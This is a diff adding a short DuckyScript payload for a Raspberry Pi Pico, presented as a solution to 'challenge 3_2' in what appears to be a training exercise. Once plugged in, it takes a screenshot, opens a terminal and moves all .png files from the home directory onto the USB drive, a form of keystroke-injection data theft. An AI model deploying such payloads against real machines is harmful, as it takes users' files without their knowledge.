@@ -1,0 +1,20 @@
+REM This is a functional code and shows one of many ways to solve
+REM challenge 3_2
+REM If you want to use this then you have to rename it to `payload.dd`
+
+DELAY 1000
+
+PRINTSCREEN
+DELAY 500
+
+REM Saves the screenshot onto the pico
+CTRL ALT t
+DELAY 500
+
+STRING cd $HOME
+DELAY 500
+
+REM verify these values
+STRING mv *.png /media/$USER/RPI-RP2/
+ENTER
+
